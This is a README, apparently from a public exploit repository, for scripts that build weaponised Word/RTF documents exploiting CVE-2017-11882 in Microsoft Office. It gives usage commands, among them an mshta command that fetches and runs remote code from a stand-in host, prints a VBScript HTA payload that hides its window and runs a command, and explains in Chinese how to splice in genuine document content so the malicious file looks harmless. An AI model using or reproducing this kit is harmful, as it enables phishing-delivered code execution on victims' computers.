# CVE-2017-11882

43b 原脚本来自于 https://github.com/embedi/CVE-2017-11882

109b 原脚本来自于 https://github.com/unamer/CVE-2017-11882/ （膜一波，现在unamer的代码已经可以执行shellcode了~）


CVE-2017-11882:
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/

MITRE CVE-2017-11882:
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882

Research:
https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about

Patch analysis:
https://0patch.blogspot.ru/2017/11/did-microsoft-just-manually-patch-their.html

DEMO PoC exploitation:
https://www.youtube.com/watch?v=LNFG0lktXQI&lc=z23qixrixtveyb2be04t1aokgz10ymfjvfkfx1coc3qhrk0h00410


## Usage


```python
python Command_CVE-2017-11882.py -c "cmd.exe /c calc.exe" -o test.doc
```

use mshta
```python
python Command_CVE-2017-11882.py -c "mshta http://site.com/abc" -o test.doc
```
abc
```html
<HTML> 
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<HEAD> 
<script language="VBScript">
Window.ReSizeTo 0, 0
Window.moveTo -2000,-2000
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "calc.exe"
self.close
</script>
<body>
demo
</body>
</HEAD> 
</HTML> 

```

>43b命令长度不能超过43 bytes，109b命令长度不能超过109 bytes

# Sample exploit for CVE-2017-11882 (starting calc.exe as payload)

`example` folder holds an .rtf file which exploits CVE-2017-11882 vulnerability and runs calculator in the system.

## 关于自定义内容

其实关于自定义内容的姿势也是跟别的师傅学来的，很早之前就已经写成脚本了，本来不打算公开，但是看到小组内已经有人发出来了，没办法，只能公开了，其实方式很简单，只需要文本文件打开正常的文档rtf，复制{\*\datastore 之前的所有内容，替换 {\object\objautlink\objupdate之前的内容即可，所以写到脚本里面就很简单了。

添加自定义内容使用方式,选择任意脚本：

```
python Command109b_CVE-2017-11882.py -c "mshta http://site.com/abc" -o test.doc -i input.rtf
```

自定义内容在input.rtf中。


关于unamer的最新的605字节利用脚本就不更新了，有兴趣自己改。


